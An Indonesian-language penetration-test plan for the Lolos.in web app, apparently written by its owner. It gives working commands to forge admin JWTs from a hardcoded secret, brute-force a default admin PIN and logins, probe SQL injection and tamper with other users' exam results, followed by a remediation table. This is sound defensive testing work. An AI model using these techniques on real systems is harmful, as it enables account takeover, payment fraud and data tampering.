# Red Team Security Audit: Lolos.in Web Application

## Goal
Melakukan pengujian keamanan (authorized red team engagement) secara sistematis pada seluruh permukaan serangan platform Lolos.in untuk mengidentifikasi dan memvalidasi celah keamanan kritis sebelum eksploitasi oleh pihak tidak bertanggung jawab.

---

## Current Context / Assumptions
- **Target**: Next.js 15 App Router, PostgreSQL (Neon Serverless), Tailwind CSS, di-hosting di Vercel (production) dan Railway (staging).
- **Attack Surface Teridentifikasi**:
  - 31 endpoint API (auth, admin, payment, results, leaderboard, webhooks)
  - 1 portal admin (`/admin-kelola`) dengan autentikasi PIN statis
  - 4 user endpoint autentikasi (register, login, forgot-password, reset-password)
  - 1 webhook endpoint publik tanpa IP allowlist
  - JWT token handling, cookie security, input sanitization
- **Metodologi**: MITRE ATT&CK-aligned dengan pendekatan grey-box (source code tersedia). Fokus pada 5 fase: TA0001 (Initial Access) → TA0006 (Credential Access) → TA0005 (Defense Evasion) → TA0007 (Discovery) → TA0010 (Exfiltration simulation).

---

## Architecture / Proposed Approach
Setiap temuan dikonfirmasi dengan bukti eksploitasi fungsional (payload, curl command, script). Validasi tidak merusak data produksi — setiap eksploitasi dibatasi pada mode read-only atau sandbox environment. Temuan diklasifikasikan dengan severity (Critical/High/Medium/Low) dan direkomendasikan remediasi langsung.

---

## Step-by-Step Tasks

### Task 1: Validasi Hardcoded JWT Secret & Token Forging
**Severity**: Critical
**File yang diinspeksi**: `src/lib/auth.ts`
**Temuan**: Fallback JWT secret hardcoded `'lolos-in-default-production-jwt-secret-key-2026'` jika env `JWT_SECRET` tidak diset.

**Langkah Validasi**:
1. Cek apakah JWT secret diset di environment:
```bash
cd "C:/Users/cubeb/OneDrive/Documents/coding/projects/belajar-cpns-saas"
grep -rn "JWT_SECRET" .env* --include="*"
```
2. Jika tidak diset, forge token admin:
```bash
node -e "
const { SignJWT } = require('jose');
const secret = new TextEncoder().encode('lolos-in-default-production-jwt-secret-key-2026');
(async () => {
  const token = await new SignJWT({ email: 'admin@lolos.in', userId: 'admin-forged' })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(secret);
  console.log('FORGED TOKEN:', token);
  // Verify it works
  const { jwtVerify } = require('jose');
  const { payload } = await jwtVerify(token, secret);
  console.log('VERIFIED PAYLOAD:', payload);
})();
"
```
3. **Expected output**: Token sukses diverifikasi dengan payload `admin-forged` — membuktikan attacker bisa login sebagai user manapun.

---

### Task 2: Validasi Admin PIN Default & Brute Force
**Severity**: Critical
**File yang diinspeksi**: `src/app/api/admin/packages/route.ts` (line 8), seluruh admin route.
**Temuan**: `ADMIN_PIN = process.env.ADMIN_PIN || '123456'` — default PIN literal `'123456'` jika env tidak diset. PIN juga bisa dikirim via query parameter URL.

**Langkah Validasi**:
1. Cek apakah `ADMIN_PIN` diset di environment:
```bash
grep -rn "ADMIN_PIN" .env* --include="*"
```
2. Jika tidak diset, uji akses dengan PIN default via header:
```bash
curl -s -H "x-admin-pin: 123456" http://localhost:3000/api/admin/packages | head -5
```
3. Uji akses via query parameter (lebih riskan karena tercatat di log server):
```bash
curl -s "http://localhost:3000/api/admin/packages?pin=123456" | head -5
```
4. Uji brute force rate limit (tidak ada rate limiting):
```bash
for pin in 000000 111111 123456 654321 999999; do
  curl -s -o /dev/null -w "%{http_code}" -H "x-admin-pin: $pin" http://localhost:3000/api/admin/packages
  echo " -> $pin"
done
```
5. **Expected output**: Semua request sukses 200 dengan PIN `123456`, dan brute force tidak terblokir.

---

### Task 3: Uji SQL Injection pada Endpoint API
**Severity**: High
**Target endpoints**: `/api/questions/[id]`, `/api/leaderboard/[packageId]`, `/api/packages`
**Temuan**: Parameterized query via `neon` SQL tagged template literal (`sql\`...\``) sudah digunakan secara konsisten, sehingga SQL injection via query parameter tidak mungkin. Namun perlu diverifikasi bahwa tidak ada endpoint yang melakukan raw string concatenation.

**Langkah Validasi**:
1. Uji parameter injection di endpoint publik:
```bash
curl -s "http://localhost:3000/api/questions/tryout-1%27%3BDROP%20TABLE%20users--" | head -3
curl -s "http://localhost:3000/api/leaderboard/tryout-1%27%3BSELECT%201--" | head -3
```
2. **Expected output**: Error 500 atau respon JSON dengan error — bukan error SQL injection. Verifikasi database masih utuh.

---

### Task 4: Uji Rate Limiting pada Auth Endpoint
**Severity**: High
**Target endpoints**: `/api/auth/login`, `/api/auth/register`, `/api/auth/forgot-password`
**Temuan**: Tidak ada rate limiting — attacker bisa melakukan brute force password, spam OTP, atau enumerasi email.

**Langkah Validasi**:
1. Uji brute force login cepat:
```bash
time for i in $(seq 1 20); do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrongpass'$i'"}' \
    http://localhost:3000/api/auth/login | jq -r '.error // "OK"'
done
```
2. **Expected output**: 20 request sukses terkirim tanpa blocking — membuktikan tidak ada rate limiting.

---

### Task 5: Uji Weak Cookie Security & CSRF
**Severity**: High
**File**: `src/app/api/auth/login/route.ts` (line 29-35)
**Temuan**: Cookie `sameSite: 'lax'` dan `secure: process.env.NODE_ENV === 'production'` — di production secure flag aktif, tapi `sameSite: 'lax'` memungkinkan CSRF via GET request.

**Langkah Validasi**:
1. Periksa security cookie flag:
```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"admin@lolos.in","password":"test123"}' \
  http://localhost:3000/api/auth/login -v 2>&1 | grep -i "set-cookie"
```
2. **Expected output**: Cookie `cpns_token` tanpa `SameSite=Strict`, memungkinkan CSRF dari origin lain yang melakukan navigasi GET.

---

### Task 6: Uji Webhook Payment Signature Bypass
**Severity**: High
**File**: `src/app/api/webhooks/klikqris/route.ts` (line 60-65)
**Temuan**: Verifikasi signature hanya dilakukan jika `order.signature` DAN `incomingSig` keduanya ada. Jika salah satu null/undefined, verifikasi dilewati.

**Langkah Validasi**:
1. Cari order yang memiliki `signature = null`:
```bash
cd "C:/Users/cubeb/OneDrive/Documents/coding/projects/belajar-cpns-saas"
node -e "
const { neon } = require('@neondatabase/serverless');
const fs = require('fs');
const env = fs.readFileSync('.env.local', 'utf8');
const dbUrl = env.match(/DATABASE_URL=([^\r\n]+)/)[1];
const sql = neon(dbUrl);
(async () => {
  const rows = await sql\`SELECT id, status, signature FROM payment_orders WHERE signature IS NULL LIMIT 5\`;
  console.log('Orders without signature:', rows.length);
  console.log(JSON.stringify(rows, null, 2));
})();
"
```
2. **Expected output**: Jika ada order tanpa signature, attacker bisa memalsukan webhook callback `{"order_id": "INV-1", "status": "PAID"}` untuk upgrade akun tanpa bayar.

---

### Task 7: Uji IDOR (Insecure Direct Object Reference)
**Severity**: Medium
**Target endpoints**: `/api/user/profile`, `/api/results`
**Temuan**: Endpoint `/api/results` menerima `userId` dari body request (line 15: `let finalUserId = userId`). Attacker bisa menyisipkan userId lain untuk membaca/memanipulasi hasil ujian orang lain.

**Langkah Validasi**:
1. Kirim hasil ujian dengan userId palsu:
```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"packageId":"tryout-1","answers":{"1":"A","2":"B"},"scoreTwk":65,"scoreTiu":80,"scoreTkp":166,"totalScore":311,"isPassed":true,"userId":"target-user-id-123"}' \
  http://localhost:3000/api/results
```
2. **Expected output**: Hasil ujian tersimpan dengan userId yang bukan milik attacker — memungkinkan manipulasi skor akun lain.

---

### Task 8: Uji OTP Enumeration via Timing Attack
**Severity**: Medium
**Target endpoint**: `/api/auth/verify-otp`, `/api/auth/reset-password`
**Temuan**: Tidak ada delay konsisten pada OTP yang salah — attacker bisa melakukan timing attack atau brute force 6-digit OTP.

**Langkah Validasi**:
1. Uji waktu respons untuk OTP benar vs salah:
```bash
# Measure response time for wrong OTP
time curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","otp":"000000"}' \
  http://localhost:3000/api/auth/verify-otp
```
2. **Expected output**: Response time konsisten tanpa variasi yang bisa dieksploitasi untuk timing attack.

---

### Task 9: Uji Information Disclosure di Error Response
**Severity**: Low
**Target**: Semua endpoint API
**Temuan**: Beberapa endpoint mengembalikan error stack trace (`String(e)`) dalam respons JSON.

**Langkah Validasi**:
1. Cari endpoint yang me-return raw error:
```bash
# Dari source code audit — endpoint yang return String(e):
# - /api/results line 38: return NextResponse.json({ error: String(e) }, { status: 500 });
# - /api/admin/packages line 142: return NextResponse.json({ error: String(err) }, { status: 500 });
# - /api/leaderboard line 18: return NextResponse.json({ error: String(e) }, { status: 500 });
```
2. Uji trigger error:
```bash
curl -s http://localhost:3000/api/leaderboard/nonexistent-package
```
3. **Expected output**: Mungkin mengembalikan error stack yang membocorkan path server, struktur database, atau query SQL.

---

### Task 10: Uji CSP & Security Headers
**Severity**: Low
**Target**: Semua halaman
**Temuan**: Tidak ada Content Security Policy, X-Frame-Options, atau security headers lain.

**Langkah Validasi**:
1. Periksa response headers:
```bash
curl -s -I http://localhost:3000/ | grep -iE "content-security-policy|x-frame-options|x-content-type|x-xss-protection|strict-transport-security"
```
2. **Expected output**: Tidak ada security headers — memungkinkan clickjacking, XSS, dan MIME-type sniffing.

---

### Task 11: Uji Session Storage Admin PIN
**Severity**: High
**File**: `src/app/admin-kelola/page.tsx` (line 74-76, 91)
**Temuan**: Admin PIN disimpan di `sessionStorage` dengan key `'admin_pin'` dan dikirim sebagai header `x-admin-pin` pada setiap request. Jika ada XSS, attacker bisa membaca PIN admin dari sessionStorage.

**Langkah Validasi**:
1. Buka `/admin-kelola`, login dengan PIN, buka DevTools → Application → Session Storage.
2. **Expected output**: PIN terlihat jelas di key `admin_pin` — siapa pun dengan akses DevTools (atau XSS) bisa membaca PIN.

---

## Ringkasan Temuan & Remediasi

| # | Temuan | Severity | File | Remediasi |
|---|--------|----------|------|-----------|
| 1 | JWT secret hardcoded fallback | **Critical** | `src/lib/auth.ts:5` | Set `JWT_SECRET` di environment production; gunakan `crypto.randomBytes(32).toString('hex')` |
| 2 | Admin PIN default '123456' | **Critical** | `src/app/api/admin/packages/route.ts:8` | Set `ADMIN_PIN` di env; implementasi JWT-based admin auth |
| 3 | Tidak ada rate limiting | **High** | Semua auth endpoint | Implementasi `@upstash/ratelimit` atau Vercel KV rate limiting |
| 4 | CSRF via sameSite lax | **High** | `src/app/api/auth/login/route.ts:33` | Ubah `sameSite` ke `'strict'`; tambahkan CSRF token |
| 5 | Webhook signature bypassable | **High** | `src/app/api/webhooks/klikqris/route.ts:62` | Wajibkan signature verification; tambahkan IP allowlist |
| 6 | IDOR di results endpoint | **Medium** | `src/app/api/results/route.ts:15` | Validasi userId wajib cocok dengan token JWT |
| 7 | Admin PIN via query parameter | **High** | 7 admin route files | Hapus fallback ke `searchParams.get('pin')` |
| 8 | Error stack trace bocor | **Low** | 3+ endpoint | Ganti `String(e)` dengan `'Internal server error'` |
| 9 | Tidak ada security headers | **Low** | Seluruh app | Tambahkan middleware Next.js untuk security headers |
| 10 | Session storage PIN exposure | **High** | `src/app/admin-kelola/page.tsx:91` | Pindahkan auth ke JWT-based, hapus sessionStorage PIN |

---

## Output yang Diharapkan
Setiap task akan dieksekusi dengan:
1. Bukti eksploitasi fungsional (curl output, script result)
2. Klasifikasi severity berdasarkan CVSS 3.1
3. Rekomendasi remediasi langsung (file path, code snippet, env config)

---

## Risks, Tradeoffs, and Open Questions
- **Database Safety**: Semua eksploitasi yang melibatkan database dilakukan dalam mode read-only atau pada data test. Tidak ada perintah DROP/ALTER/DELETE yang dieksekusi.
- **Production vs Local**: Beberapa uji (brute force, timing attack) lebih aman dijalankan di localhost development server. Jika production sudah live, tes rate limiting bisa memicu false alarm di Vercel.
- **KlikQRIS Webhook**: Uji signature bypass pada webhook dilakukan secara lokal dengan mock data, bukan mengirim payload palsu ke endpoint live Vercel.
- **Otorisasi**: Pengujian dilakukan oleh pemilik repositori pada aplikasinya sendiri — ini adalah authorized penetration test sesuai ketentuan penggunaan.
